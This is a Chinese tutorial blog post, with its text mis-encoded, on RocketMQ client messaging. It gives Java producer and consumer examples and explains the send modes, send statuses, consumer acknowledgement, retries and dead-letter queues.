#e7daff}.markdown-body pre&gt;code::-webkit-scrollbar{height:6px;background-color:#f8f5ff}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:#e7daff;border-bottom-left-radius:3px;border-bottom-right-radius:3px}.markdown-body hr{margin:2em 0;border-top:1px solid #a862ea}.markdown-body table{width:100%;font-size:12px;max-width:100%;overflow:auto;border-collapse:collapse}.markdown-body thead{color:#a862ea;background:#f8f5ff}.markdown-body td,.markdown-body th{padding:.5em;border:1px solid #e7daff}.markdown-body tr{background-color:#f8f5ff}@media (max-width:720px){.markdown-body{font-size:12px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">RocketMQä»å®æˆ˜åˆ°æºç ï¼šå®¢æˆ·ç«¯æ¶ˆæ¯æœºåˆ¶</h2>
<blockquote>
<p>ğŸ˜„ç”Ÿå‘½ä¸æ¯ï¼Œå†™ä½œä¸æ­¢</p>
<p>ğŸ”¥ ç»§ç»­è¸ä¸Šå­¦ä¹ ä¹‹è·¯ï¼Œå­¦ä¹‹åˆ†äº«ç¬”è®°</p>
<p>ğŸ‘Š æ€»æœ‰ä¸€å¤©æˆ‘ä¹Ÿèƒ½åƒå„ä½å¤§ä½¬ä¸€æ ·</p>
<p>ğŸ† <a href="https://juejin.cn/user/2502950820787672" target="_blank" title="https://juejin.cn/user/2502950820787672">åšå®¢é¦–é¡µ</a> Â Â <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.cnblogs.com%2Flyd-code%2F" target="_blank" title="https://www.cnblogs.com/lyd-code/" ref="nofollow noopener noreferrer">@æ€’æ”¾å§å¾·å¾·</a>Â Â <a href="https://link.juejin.cn?target=https%3A%2F%2Flydandtry.github.io%2F" target="_blank" title="https://lydandtry.github.io/" ref="nofollow noopener noreferrer">Toè®°å½•é¢†åœ°</a> <a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2Fqq_43843951%3Ftype%3Dblog" target="_blank" title="https://blog.csdn.net/qq_43843951?type=blog" ref="nofollow noopener noreferrer">@ä¸€ä¸ªæœ‰æ¢¦æœ‰æˆçš„äºº</a></p>
<p>ğŸŒåˆ†äº«å­¦ä¹ å¿ƒå¾—ï¼Œæ¬¢è¿æŒ‡æ­£ï¼Œå¤§å®¶ä¸€èµ·å­¦ä¹ æˆé•¿ï¼</p>
</blockquote>
<p><em>è½¬å‘è¯·æºå¸¦ä½œè€…ä¿¡æ¯</em>Â  <strong>@æ€’æ”¾å§å¾·å¾·(æ˜é‡‘) @ä¸€ä¸ªæœ‰æ¢¦æœ‰æˆçš„äºº(CSDN)</strong></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7c33ed4ee428469db4621f0d3f673b67~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oCS5pS-5ZCn5b635b63:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769523170&amp;x-signature=ZyU9aRoqKl3hAsUfbYsLVPSurBU%3D" alt="rocketmqå°é¢.png" loading="lazy"/></p>
<h3 data-id="heading-1">å‰è¨€</h3>
<p>å‰é¢ä¸€ç¯‡æ–‡ç« ï¼Œæˆ‘ä»¬ç®€å•å­¦ä¹ äº† RockerMQ çš„å®‰è£…ä»¥åŠç®€å• demoï¼Œç°åœ¨æˆ‘ä»¬å°±è¿›ä¸€æ­¥å­¦ä¹  RockerMQ çš„æ¶ˆæ¯æœºåˆ¶ã€‚æœ¬ç¯‡ç¯‡å¹…è¾ƒå¤§ï¼Œå†…å®¹è¾ƒå¤šï¼Œåç»­ä¼šå°†æ¯ä¸ªæ¶ˆæ¯æœºåˆ¶è¿›è¡ŒæŠ½å–ã€‚</p>
<h3 data-id="heading-2">1 åŸºç¡€ä½¿ç”¨</h3>
<p>é€šè¿‡ rocket çš„ä»£ç ä¸­çš„ example æ¡ˆä¾‹ï¼Œé‡Œé¢æœ‰ç®€å•çš„ä¾‹å­ã€‚ï¼ˆåŒ…ï¼šorg.apache.rocketmq.example.quickstartï¼‰</p>
<p>ç”Ÿäº§è€…ä»£ç ï¼š</p>
<pre><code class="hljs language-shell" lang="shell">public class Producer {

    /**
     * The number of produced messages.
     */
    public static final int MESSAGE_COUNT = 1000;
    public static final String PRODUCER_GROUP = "Study1";
    public static final String DEFAULT_NAMESRVADDR = "192.168.109.134:9876";
    public static final String TOPIC = "TopicTest";
    public static final String TAG = "TagA";

    public static void main(String[] args) throws MQClientException, InterruptedException {

        // åˆ›å»ºç”Ÿäº§è€…ï¼ŒæŒ‡å®šç”Ÿäº§ç»„
        DefaultMQProducer producer = new DefaultMQProducer(PRODUCER_GROUP);

        // è®¾ç½®Nameserveråœ°å€
        producer.setNamesrvAddr(DEFAULT_NAMESRVADDR);

        // å¯åŠ¨ç”Ÿäº§è€…
        producer.start();

        for (int i = 0; i &lt; MESSAGE_COUNT; i++) {
            try {
                // åˆ›å»ºæ¶ˆæ¯ä½“ï¼šè®¢é˜…ä¸»é¢˜ã€Tagã€æ¶ˆæ¯ä½“
                Message msg = new Message(TOPIC,
                        TAG,
                        ("Hello RocketMQ " + i).getBytes(RemotingHelper.DEFAULT_CHARSET)
                );

                // å‘é€æ¶ˆæ¯
                SendResult sendResult = producer.send(msg, 20 * 1000);
                System.out.printf("%s%n", sendResult);
            } catch (Exception e) {
                e.printStackTrace();
                Thread.sleep(1000);
            }
        }
        // å…³é—­ç”Ÿäº§è€…ï¼Œé‡Šæ”¾èµ„æº
        producer.shutdown();
    }
}
</code></pre>
<p>æ¶ˆè´¹è¿™ä»£ç ï¼š</p>
<pre><code class="hljs language-shell" lang="shell">public class Consumer {

    public static final String CONSUMER_GROUP = "Study1";
    public static final String DEFAULT_NAMESRVADDR = "192.168.109.134:9876";
    public static final String TOPIC = "TopicTest";

    public static void main(String[] args) throws MQClientException {

        // åˆ›å»ºæ¶ˆè´¹è€…ï¼ŒæŒ‡å®šæ¶ˆè´¹ç»„
        DefaultMQPushConsumer consumer = new DefaultMQPushConsumer(CONSUMER_GROUP);

        // è®¾ç½®Nameserveråœ°å€
        consumer.setNamesrvAddr(DEFAULT_NAMESRVADDR);

        // å¦‚æœç‰¹å®šçš„æ¶ˆè´¹ç¾¤ä½“æ˜¯å…¨æ–°çš„ï¼Œè¯·æŒ‡å®šä»å“ªé‡Œå¼€å§‹
        consumer.setConsumeFromWhere(ConsumeFromWhere.CONSUME_FROM_FIRST_OFFSET);

        // é…ç½®è®¢é˜…ä¸»é¢˜Topicã€Tag
        consumer.subscribe(TOPIC, "*");

        // è®¾ç½®å›è°ƒå‡½æ•°ï¼Œå¤„ç†æ¶ˆæ¯
        consumer.registerMessageListener((MessageListenerConcurrently) (msg, context) -&gt; {
            System.out.printf("%s Receive New Messages: %s %n", Thread.currentThread().getName(), msg);
            return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;
        });

        // å¯åŠ¨æ¶ˆè´¹è€…ï¼Œå¯åŠ¨åä¼šä¸€ç›´æŒ‚ç€ï¼ŒæŒç»­å¤„ç†æ¶ˆæ¯
        consumer.start();

        System.out.printf("Consumer Started.%n");
    }
}
</code></pre>
<p>å®¢æˆ·ç«¯ç¼–ç¨‹é€»è¾‘é¡ºåºæ¯”è¾ƒå›ºå®šã€‚</p>
<p>â‘  ç”Ÿäº§è€…å›ºå®šæ­¥éª¤</p>
<ul>
<li>åˆ›å»ºç”Ÿäº§è€…ï¼ŒæŒ‡å®šç”Ÿäº§ç»„</li>
<li>è®¾ç½®Nameserveråœ°å€</li>
<li>å¯åŠ¨ç”Ÿäº§è€…</li>
<li>åˆ›å»ºæ¶ˆæ¯ä½“ï¼šè®¢é˜…ä¸»é¢˜ã€Tagã€æ¶ˆæ¯ä½“</li>
<li>å‘é€æ¶ˆæ¯</li>
<li>å…³é—­ç”Ÿäº§è€…ï¼Œé‡Šæ”¾èµ„æº</li>
</ul>
<p>â‘¡ æ¶ˆè´¹è€…å›ºå®šæ­¥éª¤</p>
<ul>
<li>åˆ›å»ºæ¶ˆè´¹è€…ï¼ŒæŒ‡å®šæ¶ˆè´¹ç»„</li>
<li>è®¾ç½®Nameserveråœ°å€</li>
<li>å¦‚æœç‰¹å®šçš„æ¶ˆè´¹ç¾¤ä½“æ˜¯å…¨æ–°çš„ï¼Œè¯·æŒ‡å®šä»å“ªé‡Œå¼€å§‹</li>
<li>é…ç½®è®¢é˜…ä¸»é¢˜Topicã€Tag</li>
<li>è®¾ç½®å›è°ƒå‡½æ•°ï¼Œå¤„ç†æ¶ˆæ¯</li>
<li>å¯åŠ¨æ¶ˆè´¹è€…ï¼Œå¯åŠ¨åä¼šä¸€ç›´æŒ‚ç€ï¼ŒæŒç»­å¤„ç†æ¶ˆæ¯</li>
</ul>
<h3 data-id="heading-3">2 ç¡®è®¤æ¶ˆæ¯æœºåˆ¶</h3>
<p>æ¶ˆæ¯æ˜¯å¿…å…ˆè¦ä¿è¯å®‰å…¨æ€§ï¼Œè€Œè¿™åŒ…å«äº†ä¸¤ç§ï¼Œä¸€æ˜¯è¦ç¡®ä¿æ¶ˆæ¯å‘é€åˆ° Broker ä¸Šï¼ŒäºŒæ˜¯è¦ç¡®ä¿æ¶ˆè´¹è€…èƒ½å¤Ÿæ­£å¸¸ä» Broker æ¶ˆè´¹ã€‚RocketMQ æä¾›äº†å®Œå–„çš„æ¶ˆæ¯ç¡®è®¤æœºåˆ¶ï¼Œç¡®ä¿æ¶ˆæ¯çš„å¯é ä¼ é€’ã€‚ä¸»è¦åˆ†ä¸ºç”Ÿäº§è€…å‘é€ç¡®è®¤å’Œæ¶ˆè´¹è€…æ¶ˆè´¹ç¡®è®¤ä¸¤å¤§éƒ¨åˆ†ã€‚</p>
<h4 data-id="heading-4">2.1 ç”Ÿäº§è€…ç«¯</h4>
<p>ç”Ÿäº§è€…é€šè¿‡å¤šæ¬¡é‡è¯•çš„æœºåˆ¶ä¿è¯æ¶ˆæ¯æ­£å¸¸å‘é€åˆ° Brokerã€‚ç”Ÿäº§è€…å‘é€æ¶ˆæ¯åï¼Œéœ€è¦ç¡®è®¤ Broker æ˜¯å¦æˆåŠŸæ¥æ”¶å¹¶æŒä¹…åŒ–æ¶ˆæ¯ï¼Œæ ¸å¿ƒä¾èµ– Broker çš„å“åº”ç»“æœï¼Œä¸åŒå‘é€æ¨¡å¼çš„ç¡®è®¤æ–¹å¼ä¸åŒã€‚æ¶ˆæ¯ç”Ÿäº§è€…çš„ 3 ç§æ¶ˆæ¯å‘é€æ–¹æ³•ï¼šåŒæ­¥å‘é€ã€å¼‚æ­¥å‘é€ã€å•å‘å‘é€ï¼ˆ3 ç§ç®€å•ä»£ç ä¸Šæ–‡å‡æœ‰æåŠï¼‰ã€‚</p>
<h5 data-id="heading-5">2.1.1 å‘é€æ¨¡å¼ä¸ç¡®è®¤é€»è¾‘</h5>

























<table><thead><tr><th align="center">æ–¹å¼</th><th>ç¡®è®¤æ–¹å¼</th><th>åœºæ™¯</th></tr></thead><tbody><tr><td align="center">åŒæ­¥å‘é€</td><td>ç”Ÿäº§è€…é˜»å¡ç­‰å¾… Broker è¿”å›<code>SendResult</code>ï¼Œé€šè¿‡<code>SendStatus.SEND_OK</code>åˆ¤æ–­æ˜¯å¦æˆåŠŸ</td><td>æ ¸å¿ƒä¸šåŠ¡ï¼ˆå¦‚äº¤æ˜“ã€æ”¯ä»˜ï¼‰ï¼Œå¿…é¡»ç¡®ä¿æ¶ˆæ¯æŠ•é€’æˆåŠŸ</td></tr><tr><td align="center">å¼‚æ­¥å‘é€</td><td>é€šè¿‡<code>SendCallback</code>å›è°ƒå‡½æ•°æ¥æ”¶ç»“æœï¼š<code>onSuccess</code>è¡¨ç¤ºæˆåŠŸï¼Œ<code>onException</code>è¡¨ç¤ºå¤±è´¥</td><td>é«˜å¹¶å‘åœºæ™¯ï¼Œæ— éœ€é˜»å¡ç­‰å¾…ç»“æœ</td></tr><tr><td align="center">å•å‘å‘é€</td><td>åªå‘é€æ¶ˆæ¯ï¼Œä¸ç­‰å¾… Broker å“åº”ï¼Œæ— ç¡®è®¤æœºåˆ¶</td><td>éæ ¸å¿ƒä¸šåŠ¡ï¼ˆå¦‚æ—¥å¿—é‡‡é›†ï¼‰ï¼Œå…è®¸å°‘é‡ä¸¢å¤±</td></tr></tbody></table>
<p>Broker ç«¯çš„åˆ·ç›˜ / å¤åˆ¶ç­–ç•¥ä¼šå½±å“ç¡®è®¤çš„å¯é æ€§ï¼š</p>
<ul>
<li><strong>åˆ·ç›˜ç­–ç•¥</strong>ï¼šåŒæ­¥åˆ·ç›˜ï¼ˆæ¶ˆæ¯å†™å…¥åç«‹å³åˆ·ç£ç›˜ï¼Œç¡®è®¤æ…¢ä½†å¯é ï¼‰ã€å¼‚æ­¥åˆ·ç›˜ï¼ˆé»˜è®¤ï¼Œå†™å…¥å†…å­˜åç«‹å³è¿”å›ç¡®è®¤ï¼Œæ€§èƒ½é«˜ï¼‰ï¼›</li>
<li><strong>ä¸»ä»å¤åˆ¶</strong>ï¼šåŒæ­¥å¤åˆ¶ï¼ˆä¸» Broker éœ€ç­‰å¾…ä» Broker åŒæ­¥å®Œæˆå†ç¡®è®¤ï¼‰ã€å¼‚æ­¥å¤åˆ¶ï¼ˆé»˜è®¤ï¼Œä¸» Broker å†™å…¥åç›´æ¥ç¡®è®¤ï¼‰ã€‚</li>
</ul>
<h5 data-id="heading-6">2.1.2 å•å‘å‘é€</h5>
<p>å•å‘å‘é€çš„æƒ…å†µä¸‹ï¼Œç”Ÿäº§è€…åªç®¡å¾€ Broker å‘é€æ¶ˆæ¯ï¼Œå¹¶ä¸å…³å¿ƒ Broker ç«¯æ˜¯å¦æœ‰æ¥æ”¶åˆ°ã€‚</p>
<pre><code class="hljs language-shell" lang="shell">// å•å‘å‘é€ï¼ˆæ— ç¡®è®¤ï¼‰
producer.sendOneway(message);
</code></pre>
<p><code>sendOneway</code>æ–¹å¼å‘é€æ¶ˆæ¯æœ‰ä¸ªå¥½å¤„å°±æ˜¯æ•ˆç‡é«˜ï¼Œä½†æ˜¯å¦‚æœ Broker æ²¡æ”¶åˆ°çš„æ—¶å€™æ˜¯æ— æ³•è¡¥æ•‘çš„ï¼Œé€‚ç”¨æ—¥å¿—é‡‡é›†è¿™ç§å½¢å¼ã€‚</p>
<h5 data-id="heading-7">2.1.3 åŒæ­¥å‘é€</h5>
<p>åŒæ­¥å‘é€ä¹‹åä¼šé˜»å¡å½“å‰çº¿ç¨‹ï¼Œç­‰å¾… Broker å“åº”ï¼Œç›´åˆ°å¾—åˆ°å“åº”ï¼Œå¼€å‘å¯ä»¥é€šè¿‡è·å–çš„ç»“æœå»åšå…¶ä»–å¤„ç†ï¼Œå¦‚æœå‘é€å¤±è´¥å¯ä»¥è¿›è¡Œè¡¥æ•‘ï¼Œæ¯”å¦‚é‡å‘æˆ–è€…å‘Šè­¦ä¹‹ç±»ã€‚</p>
<pre><code class="hljs language-shell" lang="shell">// åŒæ­¥å‘é€ï¼ˆæœ‰ç¡®è®¤ï¼‰
SendResult sendResult = producer.send(message);
System.out.println("å‘é€çŠ¶æ€ï¼š" + sendResult.getSendStatus()); // SEND_OK
</code></pre>
<p>SendResult æ˜¯ Broker è¿”å›çš„ä¿¡æ¯ï¼Œå¯ä»¥æŸ¥çœ‹çŠ¶æ€æ˜¯å¦æˆåŠŸã€‚é‡Œé¢æœ‰ <code>SendStatus</code>ï¼Œç”¨æ¥è¡¨ç¤ºå‘é€çŠ¶æ€ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">enum</span> <span class="hljs-title class_">SendStatus</span> {
    SEND_OK,
    FLUSH_DISK_TIMEOUT,
    FLUSH_SLAVE_TIMEOUT,
    SLAVE_NOT_AVAILABLE;

    <span class="hljs-keyword">private</span> <span class="hljs-title function_">SendStatus</span><span class="hljs-params">()</span> {
    }
}
</code></pre>
<p>è¿™ä¸ªæšä¸¾çš„è¯´æ˜å¦‚ä¸‹ï¼š</p>
<ul>
<li><strong>SEND_OK</strong>: å‘é€æˆåŠŸï¼Œæ¶ˆæ¯å·²æŒä¹…åŒ–åˆ°Broker</li>
<li><strong>FLUSH_DISK_TIMEOUT</strong>: åˆ·ç›˜è¶…æ—¶ï¼ˆåŒæ­¥åˆ·ç›˜æ¨¡å¼ï¼‰</li>
<li><strong>FLUSH_SLAVE_TIMEOUT</strong>: åŒæ­¥åˆ°Slaveè¶…æ—¶ï¼ˆä¸»ä»æ¨¡å¼ï¼‰</li>
<li><strong>SLAVE_NOT_AVAILABLE</strong>: Slaveä¸å¯ç”¨</li>
</ul>
<blockquote>
<p>ä½†æ˜¯æ­¤æ—¶è¦æ³¨æ„ï¼Œå¦‚æœBrokerç«¯è¿”å›çš„SendStatusä¸æ˜¯SEND_OKï¼Œä¹Ÿå¹¶ä¸è¡¨ç¤ºæ¶ˆæ¯å°±â¼€å®šä¸ä¼šæ¨é€ç»™ä¸‹æ¸¸çš„æ¶ˆè´¹è€…ã€‚ä»…ä»…åªæ˜¯è¡¨ç¤ºBrokerç«¯å¹¶æ²¡æœ‰å®Œå…¨æ­£ç¡®çš„å¤„ç†è¿™äº›æ¶ˆæ¯ã€‚å› æ­¤ï¼Œå¦‚æœè¦é‡æ–°å‘é€æ¶ˆæ¯ï¼Œæœ€å¥½è¦å¸¦ä¸Šå”¯â¼€çš„ç³»ç»Ÿæ ‡è¯†ï¼Œè¿™æ ·åœ¨æ¶ˆè´¹è€…ç«¯ï¼Œæ‰èƒ½â¾ƒâ¾åšå¹‚ç­‰åˆ¤æ–­ã€‚ä¹Ÿå°±æ˜¯â½¤å…·æœ‰ä¸šåŠ¡å«ä¹‰çš„OrderIDè¿™æ ·çš„å­—æ®µæ¥åˆ¤æ–­æ¶ˆæ¯æœ‰æ²¡æœ‰è¢«é‡å¤å¤„ç†ã€‚</p>
</blockquote>
<p>åŒæ­¥çš„å¯èƒ½ä¼šå¯¼è‡´å‘é€è€—æ—¶æ¯”è¾ƒé•¿ï¼Œå½±å“åç»­é€»è¾‘ã€‚</p>
<h5 data-id="heading-8">2.1.4 å¼‚æ­¥å‘é€</h5>
<p>å¼‚æ­¥å‘é€æœºåˆ¶ä¸‹ï¼Œâ½£äº§è€…åœ¨å‘Brokerå‘é€æ¶ˆæ¯æ—¶ï¼Œä¼šåŒæ—¶æ³¨å†Œâ¼€ä¸ªå›è°ƒå‡½æ•°ã€‚æ¥ä¸‹æ¥â½£äº§è€…å¹¶ä¸ç­‰å¾…Brokerçš„å“åº”ã€‚å½“Brokerç«¯æœ‰å“åº”æ•°æ®è¿‡æ¥æ—¶ï¼Œâ¾ƒåŠ¨è§¦å‘å›è°ƒå‡½æ•°è¿›â¾å¯¹åº”çš„å¤„ç†ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">//  å¼‚æ­¥å‘é€ï¼ˆå›è°ƒç¡®è®¤ï¼‰</span>
producer.send(message, <span class="hljs-keyword">new</span> <span class="hljs-title class_">SendCallback</span>() {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onSuccess</span><span class="hljs-params">(SendResult sendResult)</span> {
        <span class="hljs-comment">// å‘é€æˆåŠŸå›è°ƒ</span>
    }
    
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onException</span><span class="hljs-params">(Throwable e)</span> {
        <span class="hljs-comment">// å‘é€å¤±è´¥å›è°ƒ</span>
    }
});
</code></pre>
<p>è¿™ä¸ªå›è°ƒå‡½æ•°æ˜¯ç”¨æ¥å¤„ç†æˆåŠŸä¸å¤±è´¥çš„é€»è¾‘ï¼Œå¦‚æœå¤±è´¥äº†ï¼Œå°±ä¼šæ‰§è¡Œ <code>onException</code>ä»£ç é€»è¾‘ï¼Œå¯ä»¥åœ¨è¿™é‡Œå®šä¹‰å¯¹åº”çš„è¡¥æ•‘æªæ–½ã€‚</p>
<blockquote>
<p>æ³¨ï¼šè§¦å‘äº†SendCallbackçš„onExceptionâ½…æ³•åŒæ ·å¹¶ä¸â¼€å®šå°±è¡¨ç¤ºæ¶ˆæ¯ä¸ä¼šå‘æ¶ˆè´¹è€…æ¨</p>
<p>é€ã€‚å¦‚æœBrokerç«¯è¿”å›å“åº”ä¿¡æ¯å¤ªæ…¢ï¼Œè¶…è¿‡äº†è¶…æ—¶æ—¶é—´ï¼Œä¹Ÿä¼šè§¦å‘ <strong>onException</strong> æ–¹æ³•ã€‚</p>
<p>è¶…æ—¶é»˜è®¤æ˜¯ 3 ç§’ï¼Œé€šè¿‡ <strong>producer.setSendMsgTimeout</strong> å¯ä»¥ä¿®æ”¹ã€‚</p>
</blockquote>
<h4 data-id="heading-9">2.2 æ¶ˆè´¹è€…ç«¯çŠ¶æ€ç¡®è®¤æœºåˆ¶</h4>
<p>æ¶ˆè´¹è€…ç«¯é‡‡ç”¨çŠ¶æ€ç¡®è®¤æœºåˆ¶ä¿è¯æ¶ˆè´¹è€…â¼€å®šèƒ½æ­£å¸¸å¤„ç†å¯¹åº”çš„æ¶ˆæ¯ã€‚æ¶ˆè´¹è€…çš„ç¡®è®¤æœºåˆ¶æ ¸å¿ƒæ˜¯ <strong>æ¶ˆè´¹åç§»é‡ï¼ˆOffsetï¼‰çš„æäº¤</strong> â€”â€”Offset è¡¨ç¤ºæ¶ˆè´¹è€…æ¶ˆè´¹åˆ°é˜Ÿåˆ—çš„å“ªä¸ªä½ç½®ï¼ŒBroker é€šè¿‡ Offset åˆ¤æ–­æ¶ˆæ¯æ˜¯å¦å·²è¢«æ¶ˆè´¹ã€‚ä¹Ÿå°±æ˜¯æ¶ˆè´¹è€…ä¼šè¿”å›ç»“æœç»™ Brokerï¼ŒBrokerç­‰å¾…æ¶ˆè´¹è€…è¿”å›æ¶ˆæ¯å¤„ç†çŠ¶æ€ã€‚</p>
<h5 data-id="heading-10">2.2.1 è‡ªåŠ¨ç¡®è®¤</h5>
<p>åŸç†ï¼šæ¶ˆè´¹çº¿ç¨‹å¤„ç†æ¶ˆæ¯æ—¶å¦‚æœ<strong>æ²¡æœ‰æŠ›å‡ºå¼‚å¸¸</strong>ï¼Œå®¢æˆ·ç«¯ä¼šè‡ªåŠ¨å‘ Broker æäº¤ Offsetï¼ŒBroker æ ‡è®°æ¶ˆæ¯å·²æ¶ˆè´¹ï¼›å¦‚æœæŠ›å‡ºå¼‚å¸¸ï¼Œä¸æäº¤ Offsetï¼ŒBroker ä¼šé‡è¯•è¯¥æ¶ˆæ¯ã€‚</p>
<blockquote>
<p>æ³¨æ„ï¼šæ‰¹é‡æ¶ˆè´¹æ—¶ï¼Œåªè¦æœ‰ä¸€æ¡æ¶ˆæ¯æ¶ˆè´¹å¤±è´¥ï¼Œæ•´ä¸ªæ‰¹æ¬¡çš„ Offset éƒ½ä¸ä¼šæäº¤ï¼Œä¼šé‡è¯•æ•´ä¸ªæ‰¹æ¬¡ã€‚</p>
</blockquote>
<p>ä»£ç ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// PushConsumer - è‡ªåŠ¨ç¡®è®¤ï¼ˆé»˜è®¤ï¼‰</span>
<span class="hljs-type">DefaultMQPushConsumer</span> <span class="hljs-variable">consumer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultMQPushConsumer</span>(<span class="hljs-string">"group"</span>);
consumer.registerMessageListener((MessageListenerConcurrently) (msgs, context) -&gt; {
    <span class="hljs-comment">// ä¸šåŠ¡å¤„ç†</span>
    <span class="hljs-keyword">for</span> (MessageExt msg : msgs) {
        System.out.println(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(msg.getBody()));
    }
    <span class="hljs-comment">// è‡ªåŠ¨è¿”å›CONSUME_SUCCESS</span>
    <span class="hljs-keyword">return</span> ConsumeConcurrentlyStatus.CONSUME_SUCCESS;
});
</code></pre>
<h5 data-id="heading-11">2.2.2 æ‰‹åŠ¨ç¡®è®¤</h5>
<p>é€‚ç”¨äºéœ€è¦ç²¾å‡†æ§åˆ¶ç¡®è®¤æ—¶æœºçš„åœºæ™¯ï¼ˆå¦‚æ¶ˆæ¯æ¶ˆè´¹åéœ€å†™å…¥æ•°æ®åº“ï¼Œéœ€ç¡®ä¿æ•°æ®åº“å†™å…¥æˆåŠŸå†ç¡®è®¤ï¼‰ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// æ‰‹åŠ¨ç¡®è®¤ç¤ºä¾‹</span>
consumer.registerMessageListener(<span class="hljs-keyword">new</span> <span class="hljs-title class_">MessageListenerConcurrently</span>() {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> ConsumeConcurrentlyStatus <span class="hljs-title function_">consumeMessage</span><span class="hljs-params">(
        List&lt;MessageExt&gt; msgs, 
        ConsumeConcurrentlyContext context
    )</span> {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// ä¸šåŠ¡å¤„ç†</span>
            processMessages(msgs);
            <span class="hljs-comment">// æ‰‹åŠ¨ç¡®è®¤æˆåŠŸ</span>
            <span class="hljs-keyword">return</span> ConsumeConcurrentlyStatus.CONSUME_SUCCESS;
        } <span class="hljs-keyword">catch</span> (Exception e) {
            <span class="hljs-comment">// è¿”å›å¤±è´¥ï¼Œç¨åé‡è¯•</span>
            <span class="hljs-keyword">return</span> ConsumeConcurrentlyStatus.RECONSUME_LATER;
        }
    }
});
</code></pre>
<h5 data-id="heading-12">2.2.3 ç¡®è®¤æ¶ˆæ¯çš„å…³é”®</h5>
<p>è¿™ä¸ªè¿”å›å€¼æ˜¯â¼€ä¸ªæšä¸¾å€¼ï¼Œæœ‰ä¸¤ä¸ªé€‰é¡¹ CONSUME_SUCCESS å’Œ RECONSUME_LATERã€‚å¦‚æœæ¶ˆè´¹è€…è¿”å› CONSUME_SUCCESSï¼Œé‚£ä¹ˆæ¶ˆæ¯è‡ªç„¶å°±å¤„ç†ç»“æŸäº†ã€‚ä½†æ˜¯å¦‚æœæ¶ˆè´¹è€…æ²¡æœ‰å¤„ç†æˆåŠŸï¼Œè¿”å›çš„æ˜¯ RECONSUME_LATERï¼ŒBroker å°±ä¼šè¿‡â¼€æ®µæ—¶é—´å†å‘èµ·æ¶ˆæ¯é‡è¯•ã€‚</p>
<p>æ¶ˆè´¹çŠ¶æ€å¦‚ä¸‹ï¼š</p>
<ul>
<li>CONSUME_SUCCESS: æ¶ˆè´¹æˆåŠŸï¼Œæ¶ˆæ¯å°†è¢«åˆ é™¤</li>
<li>RECONSUME_LATER: æ¶ˆè´¹å¤±è´¥ï¼Œç¨åé‡è¯•</li>
</ul>
<p>æ€»çš„æ¥è¯´å°±æ˜¯å¦‚ä¸‹å‡ ç‚¹</p>
<ul>
<li><strong>é‡è¯•æœºåˆ¶</strong>ï¼šæœªç¡®è®¤çš„æ¶ˆæ¯ä¼šè¿›å…¥é‡è¯•é˜Ÿåˆ—ï¼ˆ<code>%RETRY%+æ¶ˆè´¹ç»„å</code>ï¼‰ï¼Œé»˜è®¤é‡è¯• 16 æ¬¡ï¼Œè¶…è¿‡æ¬¡æ•°è¿›å…¥æ­»ä¿¡é˜Ÿåˆ—ï¼ˆ<code>%DLQ%+æ¶ˆè´¹ç»„å</code>ï¼‰ï¼›</li>
<li><strong>Offset å­˜å‚¨</strong>ï¼šBroker å°†æ¶ˆè´¹ç»„ - é˜Ÿåˆ—çš„ Offset å­˜å‚¨åœ¨å†…ç½®ä¸»é¢˜<code>consumerOffse</code>ä¸­ï¼Œå³ä½¿æ¶ˆè´¹è€…é‡å¯ä¹Ÿèƒ½æ¢å¤æ¶ˆè´¹è¿›åº¦ï¼›</li>
<li><strong>é¡ºåºæ¶ˆè´¹ç¡®è®¤</strong>ï¼šé¡ºåºæ¶ˆè´¹é»˜è®¤æ˜¯ â€œæ‰‹åŠ¨ç¡®è®¤å˜ç§â€ï¼Œé€šè¿‡åŠ é”æœºåˆ¶ä¿è¯æ¶ˆè´¹é¡ºåºï¼Œåªæœ‰å½“å‰æ¶ˆæ¯ç¡®è®¤åæ‰ä¼šæ¶ˆè´¹ä¸‹ä¸€æ¡ã€‚</li>
</ul>
<h4 data-id="heading-13">2.3 æ¶ˆè´¹è€…ç«¯è‡ªè¡ŒæŒ‡å®šæ¶ˆè´¹ç‚¹</h4>
